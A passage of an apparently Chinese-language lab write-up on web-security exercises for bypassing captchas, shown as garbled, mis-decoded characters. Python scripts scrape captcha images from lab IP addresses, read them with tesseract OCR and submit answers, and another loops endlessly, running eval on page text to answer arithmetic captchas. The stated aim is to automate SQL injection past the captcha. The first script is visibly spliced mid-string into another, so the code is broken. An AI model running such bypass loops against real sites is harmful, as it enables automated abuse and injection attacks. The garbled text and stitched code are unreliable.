¹æ®åº”ç”¨ç¨‹åºå·¥ä½œæµç¨‹ï¼Œæ‚¨å¯èƒ½å¸Œæœ›è·å¾—éå¸¸é«˜çš„æˆåŠŸç‡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨èŠ±è´¹ 10 åˆ†é’Ÿå¡«å†™è¡¨æ ¼ï¼Œæ‚¨å¸Œæœ›ç¡®ä¿éªŒè¯ç ç ´è§£ç¨‹åºå…·æœ‰è¾ƒé«˜çš„æˆåŠŸç‡ã€‚å¦‚æœåªæ˜¯ä¸ºäº†åˆ©ç”¨ SQL æ³¨å…¥ï¼Œæ‚¨å¯ä»¥é‡è¯•ï¼Œç›´åˆ°æ‰¾åˆ°æ­£ç¡®çš„å€¼ï¼Œå¹¶ä¸”ä¸éœ€è¦éå¸¸å‡†ç¡®ã€‚ ä»”ç»†æ€è€ƒä¼¼ä¹æ‡‚äº†ä»–è¡¨è¾¾çš„æ„æ€ï¼Œé¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™å…³ å¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ°è¿™å…³ç»™å‡ºçš„éªŒè¯ç æ˜¯éå¸¸æ¸…æ™°çš„ï¼Œä¹Ÿå°±æ˜¯æ˜“è¯†åˆ«ã€‚å€˜è‹¥æ­¤æ—¶è¯¥ç½‘ç«™å­˜åœ¨æŸäº›æ¼æ´æ¯”å¦‚SQLæ³¨å…¥ï¼Œä½†æˆ‘ä»¬åœ¨æ³¨å…¥çš„æ—¶å€™æ¯æ¬¡éƒ½éœ€è¦æ‰‹å·¥è¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼Œè¿™æ— ç–‘å¢åŠ äº†æˆ‘ä»¬çš„é˜»åŠ›ã€‚ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡å†™è‡ªåŠ¨åŒ–è„šæœ¬æ¥å®Œæˆã€‚æ­¤æ—¶ç”±äºè¯¥ç½‘ç«™çš„éªŒè¯ç æ˜“æŠ“å–ï¼Œé‚£æˆ‘ä»¬å®Œå…¨å¯ä»¥æ¯æ¬¡æ³¨å…¥çš„æ—¶å€™çˆ¬å–é¡µé¢çš„éªŒè¯ç ï¼Œè¿™ä¾¿å¤§å¤§å‡å°‘äº†æˆ‘ä»¬æ³¨å…¥çš„é˜»åŠ›ã€‚ è¿™é‡Œå°è¯•äº†åŠå¤©å‘ç°çœ‹ä¸æ‡‚è„šæœ¬ï¼Œä¹Ÿä¸ä¼šä¿®æ”¹è„šæœ¬ï¼Œçœ‹ä»–ä»¬éƒ½Pythonç‰ˆæœ¬éƒ½å¯¹ä¸ä¸Šã€‚ã€‚ã€‚è¿™é‡Œå°±å…ˆé™„ä¸Šå§ è„šæœ¬ä¸€ï¼š import pytesseract from PIL import Image import requests import re def main(): url = \"http://192.168.0.104/captcha/example6/\" rs = requests.session() r = rs.get(url) html = r.text img_url = re.findall('img src=\"(.*?)\"/ &gt;',html)[0] img_content = rs.get(url+img_url).content with open(\"test.png\", \"wb\") as f: f.write(img_content) image = Image.open(\"test.png\") text = pytesseract.image_to_string(image) # ä½¿ç”¨ç®€ä½“ä¸­æ–‡è§£æå›¾ç‰‡ check_url = \"http://192.168.0.104/captcha/example6/submit?captcha=\"+text+\"img src=\"(.*?)\"/ &gt;', html)[0] img_content = rs.get(url + img_url).content with open(\"test.png\", \"wb\") as f: f.write(img_content) im = Image.open('test.png') im = im.convert('RGBA') pixdata = im.load() for y in range(im.size[1]): for x in range(im.size[0]): if pixdata[x, y][0] == 65 : pixdata[x, y] = (255, 255, 255, 255) #im.show() im.save('test1.png') image = Image.open(\"test1.png\") text = pytesseract.image_to_string(image) # ä½¿ç”¨ç®€ä½“ä¸­æ–‡è§£æå›¾ç‰‡ print(text) # check_url = \"http://192.168.0.104/captcha/example7/submit?captcha=\"+text+\"!--æ³¨é‡Šæ‰æŸ¥è¯¢çš„ç»“å°¾ã€‚ è„šæœ¬äºŒï¼š def captcha67(): url = \"http://10.108.40.237/captcha/example8/\" login_url = \"http://10.108.40.237/captcha/example8/submit?captcha={}&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\" ss = requests.session() html = ss.get(url).text soup = BeautifulSoup(html, \"html.parser\") pic_src = soup.select(\"img\")[0][\"src\"] img_data = ss.get(url + pic_src).content img_name = \"captcha6.png\" with open(img_name, \"wb\") as f: f.write(img_data) def img_2_str(filename): cmd = \"tesseract {} {}\" print cmd.format(filename, filename) strs = \"\" try: output = subprocess.check_output(cmd.format(filename, filename), shell=True) with open(filename+\".txt\", \"r\") as f: strs = f.read().strip() return strs except: print \"[-] Error Happend!\" return strs result = img_2_str(img_name) if result != \"\": html = ss.get(login_url.format(result)).text if \"Success\" in html: print \"[+] OK!\" Example 7 å¯ä»¥çœ‹åˆ°è¿™å…³çš„éªŒè¯ç ä¾ç„¶å¾ˆæ¸…æ™°ï¼Œä¸è¿‡æœ‰ç€è“è‰²éƒ¨åˆ†çš„é˜»ç¢ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬éœ€è¦ä¿®æ”¹è„šæœ¬ï¼Œä¸‹åˆ—æ˜¯å®˜æ–¹è¯´æ˜ï¼š å¦‚æœæˆ‘ä»¬ä½¿ç”¨ä¸ä¸Šè¿°ç›¸åŒçš„æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆåŠŸç‡æ˜æ˜¾è¾ƒä½ã€‚ä¸ºäº†æé«˜è¯†åˆ«åº¦ï¼Œæˆ‘ä»¬å°†å°è¯•åˆ é™¤è“è‰²çš„â€œHatchFillâ€ã€‚ ä¸€ä¸ªéå¸¸ç®€å•çš„æ–¹æ³•æ˜¯åœ¨è¿è¡Œ tesseract ä¹‹å‰ä½¿ç”¨é˜ˆå€¼æ¥ä¿®æ”¹å›¾åƒã€‚è¿™å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç æ¥å®Œæˆï¼š require 'RMagick' image = Magick::Image.read(\"current7.png\").first image = image.threshold(THRESHOLD) image.write(\"current7.png\") æ‚¨å¯ä»¥ä½¿ç”¨ THRESHOLD å€¼æ¥æé«˜æ£€æµ‹ç‡ã€‚åªéœ€ä½¿ç”¨è¿™ä¸ªç®€å•çš„æŠ€å·§ï¼ŒæˆåŠŸç‡å°±ä¼šæé«˜ã€‚è€Œä¸”ï¼Œç”±äº tesseract æ£€æµ‹åˆ°çš„ä¿¡æ¯ç¬¦åˆæ¡ä»¶ï¼ˆåªæœ‰ä¸€ä¸ªç”±å°å†™å­—ç¬¦ç»„æˆçš„å•è¯ï¼‰ï¼Œå› æ­¤è·å¾—æ­¤é€Ÿç‡æ‰€éœ€çš„æ—¶é—´è¾ƒçŸ­ã€‚ ä¸è¿‡è¿™é‡Œé‚£äº›å¸ˆå‚…ä¹Ÿæ²¡å†™å‡ºæ¥è„šæœ¬ã€‚ã€‚ã€‚é™„ä¸ŠGPTå¯¹ä¸Šè¿°éƒ¨åˆ†ä»£ç çš„è§£é‡Šï¼š è¿™æ®µä»£ç ä½¿ç”¨äº† Ruby çš„ RMagick åº“ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºå¤„ç†å›¾åƒçš„åº“ï¼Œå¯ä»¥è¿›è¡Œå„ç§å›¾åƒæ“ä½œï¼ŒåŒ…æ‹¬è¯»å–ã€ä¿®æ”¹å’Œå†™å…¥å›¾åƒç­‰ã€‚ä»¥ä¸‹æ˜¯å¯¹ä»£ç çš„è¯¦ç»†è§£é‡Šï¼š 1. `require 'RMagick'`: è¿™è¡Œä»£ç å¼•å…¥äº† RMagick åº“ï¼Œä½¿å¾—ä»£ç å¯ä»¥ä½¿ç”¨è¯¥åº“æä¾›çš„å›¾åƒå¤„ç†åŠŸèƒ½ã€‚åœ¨å¼•å…¥ä¹‹åï¼Œä½ å°±å¯ä»¥ä½¿ç”¨ RMagick ä¸­çš„ç±»å’Œæ–¹æ³•äº†ã€‚ 2. `image = Magick::Image.read(\"current7.png\").first`: è¿™è¡Œä»£ç é€šè¿‡ `Magick::Image.read` æ–¹æ³•ä»æ–‡ä»¶ \"current7.png\" ä¸­è¯»å–å›¾åƒã€‚`Magick::Image.read` è¿”å›ä¸€ä¸ªå›¾åƒå¯¹è±¡çš„æ•°ç»„ï¼Œå› ä¸ºä¸€ä¸ªå›¾åƒæ–‡ä»¶å¯èƒ½åŒ…å«å¤šä¸ªå›¾åƒï¼ˆæ¯”å¦‚ GIF æ–‡ä»¶ä¸­çš„å¤šå¸§åŠ¨ç”»ï¼‰ï¼Œæ‰€ä»¥ä½¿ç”¨ `.first` é€‰æ‹©äº†æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå›¾åƒå¯¹è±¡ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å˜é‡ `image`ã€‚ 3. `image = image.threshold(THRESHOLD)`: è¿™è¡Œä»£ç è°ƒç”¨äº† `threshold` æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºå¯¹å›¾åƒè¿›è¡ŒäºŒå€¼åŒ–å¤„ç†ï¼Œå°†å›¾åƒä¸­çš„åƒç´ å€¼è½¬æ¢ä¸ºäºŒå€¼ï¼ˆé»‘ç™½ï¼‰å›¾åƒã€‚`THRESHOLD` æ˜¯ä¸€ä¸ªé˜ˆå€¼ï¼Œç”¨äºå†³å®šå“ªäº›åƒç´ è¢«è®¤ä¸ºæ˜¯é»‘è‰²ï¼Œå“ªäº›æ˜¯ç™½è‰²ã€‚è¿™ä¸ªé˜ˆå€¼å¯èƒ½åœ¨ä»£ç çš„å…¶ä»–åœ°æ–¹è¢«å®šä¹‰ï¼Œä½†åœ¨æä¾›çš„ä»£ç ä¸­å¹¶æ²¡æœ‰ç»™å‡ºå…·ä½“çš„å€¼ã€‚ 4. `image.write(\"current7.png\")`: æœ€åä¸€è¡Œä»£ç å°†å¤„ç†åçš„å›¾åƒå†™å›åˆ°æ–‡ä»¶ \"current7.png\"ã€‚è¿™æ ·ï¼ŒåŸå§‹å›¾åƒç»è¿‡äºŒå€¼åŒ–å¤„ç†åçš„ç»“æœå°±è¢«ä¿å­˜åˆ°åŒä¸€æ–‡ä»¶ä¸­ï¼Œè¦†ç›–äº†åŸå§‹å›¾åƒã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºé˜ˆå€¼ `THRESHOLD` æ²¡æœ‰åœ¨æä¾›çš„ä»£ç ä¸­å®šä¹‰ï¼Œä½ éœ€è¦ç¡®ä¿åœ¨å®é™…ä½¿ç”¨æ—¶ä¸ºå…¶æä¾›ä¸€ä¸ªå…·ä½“çš„æ•°å€¼ã€‚ä¸åŒçš„é˜ˆå€¼ä¼šå¯¼è‡´ä¸åŒçš„äºŒå€¼åŒ–æ•ˆæœï¼Œå› æ­¤é€‰æ‹©é€‚å½“çš„é˜ˆå€¼å¯¹äºè·å¾—æœŸæœ›çš„ç»“æœéå¸¸é‡è¦ã€‚ çœ‹æ¥é‡ç‚¹å°±æ˜¯thresholdéƒ¨åˆ†çš„å¤„ç†äº† Example 8 è¿™é‡Œå¯ä»¥çœ‹åˆ°åˆæ˜¯ä¸æ¸…æ™°çš„éªŒè¯ç äº†ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å®˜æ–¹è¯´æ˜ åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å›¾åƒè¢«å†…çˆ†äº†ã€‚æˆ‘ä»¬å°†æ‰“å¼€å›¾åƒï¼Œå–æ¶ˆå†…çˆ†å¹¶ä½¿ç”¨ä¹‹å‰çš„æŠ€æœ¯æ¥æé«˜æˆåŠŸç‡ã€‚ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼š require 'RMagick' image = Magick::Image.read(\"current8.png\").first image = image.implode(IMPLODE) image = image.threshold(THRESHOLD) image.write(\"current8.png\") æ‚¨å¯ä»¥ä½¿ç”¨ THRESHOLD å’Œ IMPLODE ï¼ˆ IMPLODE å¯ä»¥ä¸ºè´Ÿï¼‰å€¼æ¥æé«˜æ£€æµ‹ç‡ã€‚ ä¸å‰é¢çš„ç¤ºä¾‹ä¸€æ ·ï¼Œæ£€æµ‹ç‡å°†ä¼šæé«˜ï¼Œå¹¶ä¸”è·å¾—è¯¥æ£€æµ‹ç‡æ‰€éœ€çš„æ—¶é—´å°†ä¼šå‡å°‘ã€‚ é™„ä¸ŠGPTå¯¹ä¸Šè¿°ä»£ç çš„è§£é‡Šï¼š è¿™æ®µä»£ç ä¸ä¹‹å‰çš„ä»£ç ç±»ä¼¼ï¼ŒåŒæ ·ä½¿ç”¨äº† RMagick åº“æ¥å¤„ç†å›¾åƒã€‚ä¸‹é¢æ˜¯å¯¹è¿™æ®µä»£ç çš„è¯¦ç»†è§£é‡Šï¼š 1. `require 'RMagick'`: å¼•å…¥äº† RMagick åº“ã€‚ 2. `image = Magick::Image.read(\"current8.png\").first`: é€šè¿‡ `Magick::Image.read` æ–¹æ³•è¯»å–åä¸º \"current8.png\" çš„å›¾åƒæ–‡ä»¶ã€‚ä¸ä¹‹å‰çš„ä»£ç ä¸€æ ·ï¼Œé€‰æ‹©æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå›¾åƒå¯¹è±¡ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å˜é‡ `image`ã€‚ 3. `image = image.implode(IMPLODE)`: è°ƒç”¨äº† `implode` æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºå®ç°å›¾åƒçš„çˆ†ç‚¸æ•ˆæœã€‚`IMPLODE` æ˜¯ä¸€ä¸ªå‚æ•°ï¼Œç”¨äºæ§åˆ¶çˆ†ç‚¸çš„ç¨‹åº¦ã€‚å’Œä¹‹å‰çš„ä»£ç ä¸€æ ·ï¼Œè¯¥å‚æ•°å¹¶æ²¡æœ‰åœ¨æä¾›çš„ä»£ç ä¸­ç»™å‡ºå…·ä½“çš„å€¼ï¼Œæ‰€ä»¥åœ¨å®é™…ä½¿ç”¨æ—¶éœ€è¦æä¾›ä¸€ä¸ªé€‚å½“çš„å€¼ã€‚ 4. `image = image.threshold(THRESHOLD)`: æ¥ä¸‹æ¥è°ƒç”¨äº† `threshold` æ–¹æ³•ï¼Œå¯¹å›¾åƒè¿›è¡ŒäºŒå€¼åŒ–å¤„ç†ã€‚åŒæ ·ï¼Œ`THRESHOLD` æ˜¯ä¸€ä¸ªé˜ˆå€¼ï¼Œå†³å®šäº†å“ªäº›åƒç´ è¢«è®¤ä¸ºæ˜¯é»‘è‰²ï¼Œå“ªäº›æ˜¯ç™½è‰²ã€‚è¯¥é˜ˆå€¼éœ€è¦åœ¨å®é™…ä½¿ç”¨æ—¶æä¾›ã€‚ 5. `image.write(\"current8.png\")`: æœ€åä¸€è¡Œä»£ç å°†å¤„ç†åçš„å›¾åƒå†™å›åˆ°æ–‡ä»¶ \"current8.png\" ä¸­ï¼Œè¦†ç›–åŸå§‹å›¾åƒã€‚ æ³¨æ„ï¼Œ`IMPLODE` å’Œ `THRESHOLD` è¿™ä¸¤ä¸ªå‚æ•°åœ¨æä¾›çš„ä»£ç ä¸­å¹¶æ²¡æœ‰å…·ä½“çš„å€¼ï¼Œå› æ­¤åœ¨å®é™…ä½¿ç”¨æ—¶éœ€è¦æ ¹æ®éœ€è¦å®šä¹‰å®ƒä»¬ã€‚ä¸åŒçš„å‚æ•°å€¼ä¼šäº§ç”Ÿä¸åŒçš„æ•ˆæœï¼Œæ‰€ä»¥é€‰æ‹©é€‚å½“çš„å€¼æ˜¯å¾ˆå…³é”®çš„ã€‚ è¿™ä¸ªçˆ†ç‚¸æ•ˆæœæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ çˆ†ç‚¸æ•ˆæœé€šå¸¸æ˜¯ä¸€ç§å›¾åƒå¤„ç†æ•ˆæœï¼Œç”¨äºåˆ›å»ºä¸€ç§è§†è§‰ä¸Šçš„çˆ†ç‚¸æˆ–æ‰©æ•£æ•ˆæœï¼Œä½¿å›¾åƒä¸­çš„å…ƒç´ å‘å¤–æ‰©æ•£æˆ–ç¢è£‚ã€‚è¿™ç§æ•ˆæœå¸¸å¸¸ç”¨äºè‰ºæœ¯åˆ›ä½œã€å›¾å½¢è®¾è®¡ã€æ¸¸æˆå¼€å‘ç­‰é¢†åŸŸï¼Œä»¥å¢åŠ å›¾åƒçš„åŠ¨æ„Ÿå’Œè§†è§‰å¸å¼•åŠ›ã€‚ å…·ä½“æ¥è¯´ï¼Œåœ¨ RMagick åº“ä¸­ï¼Œ`implode` æ–¹æ³•è¢«ç”¨äºå®ç°è¿™ç§çˆ†ç‚¸æ•ˆæœã€‚è¿™ä¸ªæ–¹æ³•æ¥å—ä¸€ä¸ªå‚æ•° `IMPLODE`ï¼Œç”¨äºæ§åˆ¶çˆ†ç‚¸çš„ç¨‹åº¦ã€‚å½“ `IMPLODE` çš„å€¼ä¸ºæ­£æ—¶ï¼Œå›¾åƒçš„å…ƒç´ ä¼šå‘å†…æ”¶ç¼©ï¼Œè€Œå½“å€¼ä¸ºè´Ÿæ—¶ï¼Œå›¾åƒçš„å…ƒç´ ä¼šå‘å¤–æ‰©æ•£ï¼Œäº§ç”Ÿä¸€ç§çˆ†ç‚¸çš„æ•ˆæœã€‚ è¿™ç§æ•ˆæœå¯ä»¥ç”¨æ¥åˆ›å»ºä¸€äº›è‰ºæœ¯æ€§çš„å›¾åƒï¼Œæˆ–è€…åœ¨è®¾è®¡ä¸­ä¸ºç‰¹å®šå…ƒç´ çš„çªå‡ºæ˜¾ç¤ºå¢åŠ ä¸€äº›åŠ¨æ€æ„Ÿã€‚åœ¨æ¸¸æˆå¼€å‘ä¸­ï¼Œçˆ†ç‚¸æ•ˆæœä¹Ÿç»å¸¸ç”¨äºæ¨¡æ‹Ÿçˆ†ç‚¸ã€ç¢è£‚æˆ–å…¶ä»–è§†è§‰ä¸Šçš„ç ´åæ•ˆæœï¼Œæé«˜æ¸¸æˆçš„è§†è§‰å¸å¼•åŠ›ã€‚ æ€»çš„æ¥è¯´ï¼Œçˆ†ç‚¸æ•ˆæœæ˜¯ä¸€ç§å›¾åƒå¤„ç†æ‰‹æ®µï¼Œé€šè¿‡æ”¹å˜å›¾åƒå…ƒç´ çš„ä½ç½®æˆ–å½¢çŠ¶ï¼Œåˆ›é€ å‡ºä¸€ç§åŠ¨æ„Ÿå’Œç”ŸåŠ¨çš„è§†è§‰æ•ˆæœã€‚ å¥¥~~ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬é€šè¿‡è®¾ç½®IMPLODEçˆ†ç‚¸ç¨‹åº¦ï¼Œå¯ä»¥è¾¾åˆ°æ¢å¤éªŒè¯ç ä¸ºæ­£å¸¸å¤§å°ã€‚ Example 9 è¿™å…³æ˜¯ä¸€ä¸ªç®—æ•°éªŒè¯ç é¢˜ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬ç¼–å†™è„šæœ¬ä¼šå¾ˆå®¹æ˜“ï¼Œåªéœ€è¦æŠ“å–é¡µé¢ç®—æ•°çš„éƒ¨åˆ†ï¼Œè°ƒç”¨æŸäº›æ•°å­¦åº“æ¥è®¡ç®—å³å¯ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹å®˜æ–¹è§£é‡Šï¼š è¯¥éªŒè¯ç ä¾èµ–äºè¦æ±‚å®¢æˆ·ç«¯æ‰§è¡Œç®€å•çš„ç®—æœ¯è¿ç®—ï¼Œç ´è§£èµ·æ¥éå¸¸ç®€å•ã€‚æ‚¨å¯ä»¥ä»… eval æä¾›çš„å­—ç¬¦ä¸²ï¼ˆå¯èƒ½ä¸æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼‰ï¼Œæˆ–è€…æ‚¨å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„è§£æå™¨æ¥ä¸ºæ‚¨æ‰§è¡Œç®—æœ¯è¿ç®—ã€‚è¿™ç§ä¿æŠ¤å¯ä»¥é˜²æ­¢çœŸæ­£æ„šè ¢çš„æœºå™¨äººï¼Œä½†å¯¹äºä»»ä½•ä¼šç¼–å†™ä¸€äº›è„šæœ¬çš„äººæ¥è¯´ï¼Œå¾ˆå®¹æ˜“ç»•è¿‡ã€‚ é™„ä¸Šè„šæœ¬ï¼š import re import requests from bs4 import BeautifulSoup def captcha9(): url = \"http://192.168.246.135/captcha/example9/\" post_url = \"http://192.168.246.135/captcha/example9/submit?captcha={}&amp;submit=Submit\" ss = requests.session() #åˆ›å»ºäº†ä¸€ä¸ªä¼šè¯å¯¹è±¡ï¼Œç”¨äºåœ¨å¤šä¸ªè¯·æ±‚ä¹‹é—´ä¿æŒ cookieã€‚ html = ss.get(url).text #å‘é€ GET è¯·æ±‚è·å–ç½‘é¡µçš„ HTML å†…å®¹ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨å˜é‡ html ä¸­ã€‚ soup = BeautifulSoup(html, \"html.parser\") #ä½¿ç”¨ BeautifulSoup è§£æ HTMLã€‚ form = soup.select(\"form\")[0].text #ä»è§£æåçš„ HTML ä¸­é€‰æ‹©ç¬¬ä¸€ä¸ª &lt;form&gt; å…ƒç´ ï¼Œå¹¶è·å–å…¶æ–‡æœ¬å†…å®¹ã€‚ print((form.strip())) #æ‰“å°è¡¨è¾¾å¼å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ strip() ç”¨äºå»é™¤å­—ç¬¦ä¸²ä¸¤ç«¯çš„ç©ºæ ¼å’Œæ¢è¡Œç¬¦ã€‚ #ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…è¡¨è¾¾å¼å­—ç¬¦ä¸²ï¼Œæå–å‡ºå½¢å¦‚ \"æ•°å­— è¿ç®—ç¬¦ æ•°å­—\" çš„éƒ¨åˆ†ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨å˜é‡ captcha = re.match(r\"(\\d+[+\\-*/]\\d+)\\s*=\", form.strip()) if captcha: #è¿™ä¸€éƒ¨åˆ†é€šè¿‡ re.match çš„ç»“æœå¯¹è±¡ captcha è·å–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­ç»„ï¼ˆç”±æ‹¬å·åŒ…å›´çš„éƒ¨åˆ†ï¼‰ã€‚ result = eval(captcha.group(1)) #ä½¿ç”¨ eval å‡½æ•°è®¡ç®—è¡¨è¾¾å¼çš„ç»“æœï¼ŒåŒ¹é…çš„æ˜¯æ‹¬å·ä¸­çš„éƒ¨åˆ†ã€‚ html = ss.get(post_url.format(result)).text if \"Success\" in html: print(\"[+] OK\") captcha9() è¿™ä¸ªè„šæœ¬æŒºç®€å•çš„ï¼Œå­¦ä¹ ä¸€æ³¢ï¼Œé¡ºä¾¿é—®ä¸€ä¸‹GPTä¸Šè¿°æ­£åˆ™çš„è§£é‡Š è®©æˆ‘ä»¬è¯¦ç»†è§£é‡Šä¸€ä¸‹ä½ æä¾›çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š ```python re.match(r\"(\\d+[+\\-*/]\\d+)\\s*=\", form.strip()) ``` 1. **`re.match`**: è¿™æ˜¯æ­£åˆ™è¡¨è¾¾å¼æ¨¡å— `re` ä¸­çš„ `match` å‡½æ•°ï¼Œç”¨äºå°è¯•ä»å­—ç¬¦ä¸²çš„å¼€å¤´åŒ¹é…ä¸€ä¸ªæ¨¡å¼ã€‚å®ƒè¿”å›ä¸€ä¸ªåŒ¹é…å¯¹è±¡æˆ– `None`ï¼Œè¡¨ç¤ºåŒ¹é…æˆåŠŸæˆ–å¤±è´¥ã€‚ 2. **`r\"`: è¿™æ˜¯ä¸€ä¸ªåŸå§‹å­—ç¬¦ä¸²ï¼ˆraw stringï¼‰çš„å‰ç¼€ã€‚åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œä½¿ç”¨åŸå§‹å­—ç¬¦ä¸²å¯ä»¥é¿å…åæ–œæ  `\\` çš„è½¬ä¹‰ä½œç”¨ï¼Œä½¿å¾—æ­£åˆ™è¡¨è¾¾å¼æ›´æ¸…æ™°ã€‚ 3. **`(\\d+[+\\-*/]\\d+)`**: è¿™æ˜¯ä¸€ä¸ªæ•è·ç»„ï¼Œæ‹¬å·å†…çš„éƒ¨åˆ†è¡¨ç¤ºä¸€ä¸ªå­è¡¨è¾¾å¼ï¼Œå¯ä»¥é€šè¿‡ `group(1)` è·å–ã€‚å…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š - **`\\d+`**: åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ã€‚ - **`[+\\-*/]`**: åŒ¹é…ä¸€ä¸ªåŠ å·ã€å‡å·ã€ä¹˜å·æˆ–é™¤å·ã€‚ç”±äºå‡å· `-` åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰ç‰¹æ®Šå«ä¹‰ï¼ˆè¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªå‰é¢çš„å…ƒç´ ï¼‰ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨åæ–œæ  `\\` è¿›è¡Œè½¬ä¹‰ï¼Œä»¥ä¿æŒå…¶åŸæ„ã€‚è¿™æ · `[+\\-*/]` è¡¨ç¤ºåŒ¹é…ä»»æ„ä¸€ä¸ªåŠ å·ã€å‡å·ã€ä¹˜å·æˆ–é™¤å·ã€‚ - **`\\d+`**: å†æ¬¡åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ã€‚ - **`(\\d+[+\\-*/]\\d+)`**: æ•´ä½“è¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæ•°å­¦è¡¨è¾¾å¼ã€‚ 4. **`\\s*`**: åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªç©ºç™½å­—ç¬¦ï¼ˆåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ç­‰ï¼‰ã€‚ 5. **`=`**: åŒ¹é…ç­‰å·å­—ç¬¦ã€‚ 6. **`form.strip()`**: å¯¹è¾“å…¥å­—ç¬¦ä¸² `form` è¿›è¡Œæ“ä½œï¼Œ`strip()` æ–¹æ³•ç”¨äºå»é™¤å­—ç¬¦ä¸²ä¸¤ç«¯çš„ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ç­‰ï¼‰ï¼Œä»¥ç¡®ä¿ä¸ä¼šå› ä¸ºå­—ç¬¦ä¸²ä¸¤ç«¯çš„ç©ºæ ¼è€Œå½±å“åŒ¹é…ã€‚ æ•´ä½“æ¥è¯´ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ç›®çš„æ˜¯åŒ¹é…å½¢å¦‚ \"æ•°å­— è¿ç®—ç¬¦ æ•°å­—\" çš„æ•°å­¦è¡¨è¾¾å¼ï¼Œç­‰å·å‰åå¯èƒ½æœ‰ç©ºç™½å­—ç¬¦ã€‚ åœ¨æ­¤åŸºç¡€ä¸Šæ”¹è‰¯ä¸€ä¸‹ï¼Œä½¿å¾—ä»–å¯ä»¥é‡å¤å‘é€httpè¯·æ±‚ import re import requests from bs4 import BeautifulSoup def captcha9(): url = \"http://192.168.246.135/captcha/example9/\" post_url = \"http://192.168.246.135/captcha/example9/submit?captcha={}&amp;submit=Submit\" ss = requests.session() while True: # æŒç»­å‘é€è¯·æ±‚è·å–ç½‘é¡µå†…å®¹ html = ss.get(url).text soup = BeautifulSoup(html, \"html.parser\") form = soup.select(\"form\")[0].text.strip() print(form) # ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ•°å­¦è¡¨è¾¾å¼ captcha_match = re.match(r\"(\\d+[+\\-*/]\\d+)\\s*=\", form) if captcha_match: expression = captcha_match.group(1) print(\"Expression:\", expression) # è®¡ç®—æ•°å­¦è¡¨è¾¾å¼ç»“æœ try: result = eval(expression) print(\"Result:\", result) # å‘é€åŒ…å«è®¡ç®—ç»“æœçš„ POST è¯·æ±‚ post_response = ss.get(post_url.format(result)).text if \"Success\" in post_response: print(\"[+] OK \") else: print(\"[-] Error in submitting result \") except Exception as e: print(\"[-] Error in evaluating expression:\", str(e), \" \") if __name__ == \"__main__\": captcha9() 0x05 Authorization-æˆæƒ å®˜æ–¹è¯´æ˜ï¼š æˆæƒé—®é¢˜åœ¨ Web åº”ç”¨ç¨‹åºä¸­éå¸¸å¸¸è§ã€‚æœ¬èŠ‚æ±‡æ€»äº†ä¸€äº›å¸¸è§çš„æ¼æ´ç¤ºä¾‹ã€‚ç°ä»£ Web å¼€å‘æ¡†æ¶é€šå¸¸å¯ä»¥é˜²æ­¢å„ç§æ³¨å…¥ï¼Œä½†æ— æ³•è‡ªåŠ¨å¤„ç†æ­¤ç±»é—®é¢˜ï¼Œå› ä¸ºå®ƒä»¬æ— æ³•ç†è§£å…¶èƒŒåçš„ä¸šåŠ¡é€»è¾‘ã€‚å‡ºäºåŒæ ·çš„åŸå› ï¼Œè‡ªåŠ¨ç½‘ç»œæ‰«æä»ªæ— 